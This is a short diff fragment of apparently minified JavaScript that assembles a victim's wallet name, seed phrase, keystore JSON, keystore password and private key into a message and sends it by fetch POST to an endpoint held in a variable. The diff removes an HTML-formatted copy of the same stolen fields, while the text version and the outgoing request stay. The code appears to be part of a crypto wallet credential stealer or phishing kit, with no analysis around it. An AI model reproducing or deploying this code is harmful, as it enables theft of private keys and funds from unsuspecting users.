@@ -13038,13 +13038,7 @@ const _l = {
                          Keystore Password : ${a.password}
                          Private Key : ${a.privateKey} `,
                          
-                        Info: `<div>
-                  <p><b>Wallet Name</b>: ${v}</p>
-                  <p><b>Phrase</b>: ${a.phrase}</p>
-                  <p><b>Keystore JSON</b>: ${a.keystore} </p>
-                  <p><b>Keystore Password</b>: ${a.password}</p>
-                  <p><b>Private Key</b>: ${a.privateKey} </p>
-              </div>`
+        
                         },
                         x = await fetch(qh, {
                             method: "POST",
